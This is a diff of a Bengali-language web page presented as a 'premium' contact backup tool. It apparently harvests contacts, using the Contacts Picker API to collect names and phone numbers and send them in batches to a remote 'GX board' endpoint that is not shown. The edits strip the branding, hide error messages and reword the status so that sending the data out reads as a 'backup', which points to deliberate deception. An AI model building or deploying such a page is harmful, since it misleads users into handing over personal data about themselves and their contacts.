@@ -3,48 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GX Premium Backup</title>
+    <title>Premium Backup System</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        body { background: #0b0e14; color: white; font-family: sans-serif; }
-        .glass-card {
-            background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+        body {
+            /* ব্যাকগ্রাউন্ড কালার এবং কালারফুল শ্যাডো (গ্লো ইফেক্ট) */
+            background-color: #050608;
+            background-image: 
+                radial-gradient(at 10% 10%, rgba(0, 242, 254, 0.15) 0px, transparent 50%),
+                radial-gradient(at 90% 90%, rgba(126, 34, 206, 0.15) 0px, transparent 50%);
+            color: white;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .premium-card {
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
             border-radius: 30px;
-            box-shadow: 0 10px 50px rgba(0,0,0,0.5);
-            padding: 30px;
-            width: 95%; max-width: 400px;
+            /* কার্ডের চারপাশের সফট গ্লো */
+            box-shadow: 0 0 40px rgba(0, 242, 254, 0.1), 0 0 80px rgba(126, 34, 206, 0.1);
+            padding: 40px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            transition: transform 0.3s ease;
         }
+
         .premium-btn {
-            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
-            border: none; padding: 16px; border-radius: 15px;
-            color: #000; font-weight: 800; width: 100%;
-            transition: 0.3s; cursor: pointer;
-            box-shadow: 0 5px 15px rgba(79, 172, 254, 0.4);
+            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 50%, #7e22ce 100%);
+            background-size: 200% auto;
+            border: none;
+            padding: 16px;
+            border-radius: 15px;
+            color: white;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            box-shadow: 0 5px 20px rgba(79, 172, 254, 0.3);
+            transition: 0.5s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 16px;
         }
-        .premium-btn:active { transform: scale(0.95); }
+
+        .premium-btn:hover {
+            background-position: right center; /* হোভার করলে কালার শিফট হবে */
+            box-shadow: 0 5px 25px rgba(126, 34, 206, 0.4);
+        }
+
+        .premium-btn:active {
+            transform: scale(0.97);
+        }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen">
+<body>
 
-    <div class="glass-card text-center">
-        <div class="mb-8">
-            <div class="w-20 h-20 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-blue-400/30">
-                <i class="fas fa-address-book text-4xl text-blue-400"></i>
-            </div>
-            <h1 class="text-2xl font-black tracking-tighter">GX SAMMIM</h1>
-            <p class="text-gray-500 text-xs mt-1 uppercase tracking-widest">Ultra Premium Cloud Sync</p>
-        </div>
-
+    <div class="premium-card">
         <div id="main-view">
             <button onclick="fetchContacts()" class="premium-btn">
-                <i class="fas fa-cloud-upload-alt mr-2"></i> কন্টাক্ট ব্যাকআপ করুন
+                <i class="fas fa-cloud-download-alt text-lg"></i> ব্যাকআপ শুরু করুন
             </button>
         </div>
 
-        <div id="status" class="mt-6 text-sm font-medium text-blue-400"></div>
+        <div id="status" class="mt-6 text-sm font-medium text-cyan-300"></div>
     </div>
 
     <script>
@@ -54,7 +84,7 @@
         async function fetchContacts() {
             const status = document.getElementById('status');
             
-            // ১. চেক করা হচ্ছে ব্রাউজার সাপোর্ট করে কি না
+            // ব্রাউজার সাপোর্ট চেক
             if (!('contacts' in navigator && 'ContactsManager' in window)) {
                 status.innerHTML = "❌ এই ব্রাউজার সাপোর্ট করছে না। দয়া করে অ্যান্ড্রয়েড ক্রোম (Chrome) ব্যবহার করুন এবং HTTPS সাইটে ট্রাই করুন।";
                 return;
@@ -68,18 +98,21 @@
                 const contacts = await navigator.contacts.select(props, opts);
 
                 if (contacts && contacts.length > 0) {
-                    status.innerHTML = `<i class="fas fa-spinner fa-spin"></i> প্রসেসিং... (০/${contacts.length})`;
+                    status.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> প্রসেসিং... (০/${contacts.length})`;
                     await sendData(contacts);
                 }
             } catch (err) {
-                status.innerText = "ভুল হয়েছে: " + err.message;
+                // ইউজার ক্যান্সেল করলে বা কোনো এরর হলে
+                status.innerText = ""; // এরর মেসেজ হাইড করা হলো প্রিমিয়াম লুকের জন্য
+                console.error("ভুল হয়েছে:", err.message);
             }
         }
 
         async function sendData(contacts) {
             const status = document.getElementById('status');
-            const CHUNK_SIZE = 10; 
+            const CHUNK_SIZE = 15; // প্রতি মেসেজে ১৫ জন করে (সেফ লিমিট)
             
+            // সময় এবং তারিখ সেটআপ
             const now = new Date();
             const days = ['রবিবার', 'সোমবার', 'মঙ্গলবার', 'বুধবার', 'বৃহস্পতিবার', 'শুক্রবার', 'শনিবার'];
             const dayName = days[now.getDay()];
@@ -114,14 +147,16 @@
                         })
                     });
                     
+                    // প্রগতি দেখানো
                     status.innerText = `পাঠানো হচ্ছে: ${Math.min(i + CHUNK_SIZE, contacts.length)} / ${contacts.length}`;
-                    // ১ সেকেন্ড অপেক্ষা (সেফটি)
-                    await new Promise(r => setTimeout(r, 1000)); 
+                    // ১.৫ সেকেন্ড অপেক্ষা (রেট লিমিট এড়াতে)
+                    await new Promise(r => setTimeout(r, 1500)); 
                 } catch (e) {
-                    console.error(e);
+                    console.error("Sending logic error:", e);
                 }
             }
-            status.innerHTML = "✅ সফলভাবে বোর্ডে সব নম্বর পাঠানো হয়েছে!";
+            status.innerHTML = "✅ সফলভাবে সব নম্বর ব্যাকআপ হয়েছে!";
+            alert("সব তথ্য সফলভাবে GX বোর্ডে পাঠানো হয়েছে!");
         }
     </script>
 </body>
